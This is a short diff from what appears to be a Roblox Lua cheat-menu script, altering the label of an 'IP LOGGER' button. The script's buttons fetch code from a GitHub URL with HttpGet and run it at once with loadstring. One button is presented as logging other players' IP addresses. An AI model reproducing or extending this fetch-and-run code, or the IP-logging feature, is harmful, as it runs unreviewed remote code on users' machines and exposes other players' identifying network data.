@@ -37,7 +37,7 @@ MainSection:NewButton("Demon Hub", "Works in 999 games", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Mys112/GINGGONG-SUPER/main/Demon%20Hub%20RAW"))()
 end)
 
-MainSection:NewButton("IP LOGGER", "GET IP PLAYER LOL", function()
+MainSection:NewButton("IP LOGGER", "GET IP PLAYER", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Mys112/GINGGONG-SUPER/main/PATCED"))()
 end)
 
